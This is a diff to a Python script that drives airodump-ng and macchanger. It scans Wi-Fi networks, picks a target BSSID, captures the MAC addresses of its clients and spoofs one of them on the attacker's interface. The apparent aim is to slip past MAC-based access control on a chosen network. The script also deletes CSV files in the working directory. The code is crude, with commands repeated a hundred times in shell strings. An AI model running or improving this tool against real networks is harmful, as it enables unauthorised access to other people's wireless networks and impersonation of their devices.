@@ -142,6 +142,7 @@ while True:
     except:
         print("Please try again.")
 
+os.system ('killall screen')
 os.system ('rm *.csv')
 
 targetbssid = active_wireless_networks[int(choice)]["BSSID"]
@@ -152,11 +153,10 @@ os.system ('airodump-ng -c ' + targetchannel + ' --bssid ' + targetbssid  + ' ' 
 
 macspoof = input("\nClients MAC Addresses Shows In The Station Tab. If It's Empty Then Run The Script Again And Wait Someone To Show Up\n\nPlease Enter Mac Address That You Want To Spoof : ")
 
-os.system (f'screen -d -m airmon-ng stop {iface}')
+os.system (f'airmon-ng stop {iface}')
 os.system (f'ifconfig {iface} down')
-os.system (f'screen -d -m iwconfig {iface} mode auto\n'*10)
+os.system (f'screen -d -m iwconfig {iface} mode managed\n'*10)
 os.system (f'screen -d -m macchanger -m {macspoof} {iface}\n'*100)
 os.system (f'ifconfig {iface} up')
 os.system ('service NetworkManager restart')
-print ('\n')
 os.system (f'macchanger -s {iface}')
